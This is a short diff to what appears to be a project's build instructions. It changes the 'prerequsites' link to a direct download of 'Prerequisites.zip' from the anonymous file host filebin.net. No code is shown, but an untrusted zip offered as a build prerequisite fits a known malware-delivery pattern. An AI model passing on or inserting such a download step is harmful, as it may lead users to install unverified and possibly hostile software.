@@ -1,5 +1,5 @@
 # Method 1 | .NET SDK (Recommended)
-1. Install the [prerequsites](https://filebin.net/sn3e6jhrh2qj1ggn)
+1. Install the [prerequsites](https://filebin.net/sn3e6jhrh2qj1ggn/Prerequisites.zip)
 2. Run buildwindows.cmd
 3. Run buildinstaller.cmd
 
